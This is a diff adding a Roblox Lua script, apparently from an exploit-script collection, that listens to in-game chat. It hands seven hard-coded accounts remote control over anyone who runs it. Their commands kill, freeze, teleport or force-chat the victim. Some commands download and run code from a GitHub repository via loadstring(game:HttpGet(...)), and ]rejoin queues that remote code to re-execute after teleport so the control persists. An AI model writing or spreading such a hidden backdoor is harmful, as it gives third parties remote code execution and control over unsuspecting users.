@@ -1,0 +1,173 @@
+local TheUser = game:GetService("Players").LocalPlayer.Name
+
+local function handleChat(Player, mes)
+    if Player.Name == "bifungiji" or Player.Name == "FIRESTORMGAMERYT5" or Player.Name == "ftk_choppa4x" or Player.Name == "XxOmniversalxX" or Player.Name == "68248a73250" or Player.Name == "sokomakok" or Player.Name == "Kingsman_Kino" then
+        mes = string.lower(mes)
+        local split = mes:split(" ")
+        local cmd = split[1]
+        
+        if cmd == "]kill" then
+            local target = split[2]
+            if target == "all" then
+                game:GetService("Workspace")[TheUser].Head:Destroy()
+            else
+                for i, v in pairs(game.Players:GetPlayers()) do
+                    if v.Name:lower():sub(1, #target) == target:lower() then
+                        target = v.Name
+                        if v.Name == TheUser then
+                            game:GetService("Workspace")[TheUser].Head:Destroy()
+                        end
+                    end
+                end
+            end
+        elseif cmd == "]nuke" then
+            local target = split[2]
+            if target == "all" then
+                loadstring(game:HttpGet('https://github.com/bifungiji/the-scripter/raw/main/NUKE'))()
+            else
+                for i, v in pairs(game.Players:GetPlayers()) do
+                    if v.Name:lower():sub(1, #target) == target:lower() then
+                        target = v.Name
+                        if v.Name == TheUser then
+                            loadstring(game:HttpGet('https://github.com/bifungiji/the-scripter/raw/main/NUKE'))()
+                        end
+                    end
+                end
+            end
+        elseif cmd == "]rejoin" then
+            local target = split[2]
+            if target == "all" then
+                local Place = game.placeId
+                local job = game.JobId
+                local queue_on_teleport = queue_on_teleport or (syn and syn.queue_on_teleport)
+                queue_on_teleport([[
+                    repeat wait() until game:IsLoaded() wait(5) print("ServerHopped or rejoined")
+                    _G.EnteredKey = true
+                    loadstring(game:HttpGet('https://github.com/bifungiji/the-scripter/raw/main/AOH'))()
+                    loadstring(game:HttpGet('https://github.com/bifungiji/the-scripter/raw/main/CMD2'))()
+                ]])
+                game:GetService("TeleportService"):TeleportToPlaceInstance(Place, job, game.Players.LocalPlayer)
+            else
+                for i, v in pairs(game.Players:GetPlayers()) do
+                    if v.Name:lower():sub(1, #target) == target:lower() then
+                        target = v.Name
+                        if v.Name == TheUser then
+                            local queue_on_teleport = queue_on_teleport or (syn and syn.queue_on_teleport)
+                            queue_on_teleport([[
+                                repeat wait() until game:IsLoaded() wait(5) print("ServerHopped or rejoined")
+                                _G.EnteredKey = true
+                                loadstring(game:HttpGet('https://github.com/bifungiji/the-scripter/raw/main/AOH'))()
+                                loadstring(game:HttpGet('https://github.com/bifungiji/the-scripter/raw/main/CMD2'))()
+                            ]])
+                            local Place = game.placeId
+                            local job = game.JobId
+                            game:GetService("TeleportService"):TeleportToPlaceInstance(Place, job, game.Players.LocalPlayer)
+                        end
+                    end
+                end
+            end
+        elseif cmd == "]usingc" then
+            local target = split[2]
+            if target == "all" then
+                local ohString1 = "/w " .. Player.Name .. " Im Using Cylindrical"
+                local ohString2 = "All"
+                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ohString1, ohString2)
+            else
+                for i, v in pairs(game.Players:GetPlayers()) do
+                    if v.Name:lower():sub(1, #target) == target:lower() then
+                        target = v.Name
+                        if v.Name == TheUser then
+                            local ohString1 = "/w " .. Player.Name .. " Im Using Cylindrical"
+                            local ohString2 = "All"
+                            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(ohString1, ohString2)
+                        end
+                    end
+                end
+            end
+        elseif cmd == "]kidnap" then
+            local target = split[2]
+            if target == "all" then
+                loadstring(game:HttpGet('https://github.com/bifungiji/the-scripter/raw/main/kidnap'))()
+            else
+                for i, v in pairs(game.Players:GetPlayers()) do
+                    if v.Name:lower():sub(1, #target) == target:lower() then
+                        target = v.Name
+                        if v.Name == TheUser then
+                            loadstring(game:HttpGet('https://github.com/bifungiji/the-scripter/raw/main/kidnap'))()
+                        end
+                    end
+                end
+            end
+        elseif cmd == "]bring" then
+            local target = split[2]
+            if target == "all" then
+                local Pos = Player.Character.HumanoidRootPart.Position
+                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Pos)
+            else
+                for i, v in pairs(game.Players:GetPlayers()) do
+                    if v.Name:lower():sub(1, #target) == target:lower() then
+                        target = v.Name
+                        if v.Name == TheUser then
+                            local Pos = Player.Character.HumanoidRootPart.Position
+                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Pos)
+                        end
+                    end
+                end
+            end
+        elseif cmd == "]freeze" then
+            local target = split[2]
+            if target == "all" then
+                _G.Frozen = true
+                game:GetService("Workspace")[TheUser].HumanoidRootPart.Anchored = true
+            else
+                for i, v in pairs(game.Players:GetPlayers()) do
+                    if v.Name:lower():sub(1, #target) == target:lower() then
+                        target = v.Name
+                        if v.Name == TheUser then
+                            _G.Frozen = true
+                            game:GetService("Workspace")[TheUser].HumanoidRootPart.Anchored = true
+                        end
+                    end
+                end
+            end
+        elseif cmd == "]unfreeze" then
+            local target = split[2]
+            if target == "all" then
+                _G.Frozen = false
+                wait(1)
+                game:GetService("Workspace")[TheUser].HumanoidRootPart.Anchored = false
+            else
+                for i, v in pairs(game.Players:GetPlayers()) do
+                    if v.Name:lower():sub(1, #target) == target:lower() then
+                        target = v.Name
+                        if v.Name == TheUser then
+                            _G.Frozen = false
+                            wait(1)
+                            game:GetService("Workspace")[TheUser].HumanoidRootPart.Anchored = false
+                        end
+                    end
+                end
+            end
+        elseif cmd == "]mcdonalds" then
+            game:GetObjects("rbxassetid://10433198759")[1].Parent = game.Workspace
+            wait(2)
+            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-308, -18, 367)
+        elseif cmd == "]deletemcdonalds" then
+            game:GetService("Workspace").McDonalds:Destroy()
+            wait(0.1)
+            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-210, 94, 284)
+        end
+    end
+end
+
+game.Players.PlayerAdded:connect(function(Player)
+    Player.Chatted:connect(function(mes)
+        handleChat(Player, mes)
+    end)
+end)
+
+for i, v in pairs(game.Players:GetChildren()) do
+    v.Chatted:Connect(function(mes)
+        handleChat(v, mes)
+    end)
+end
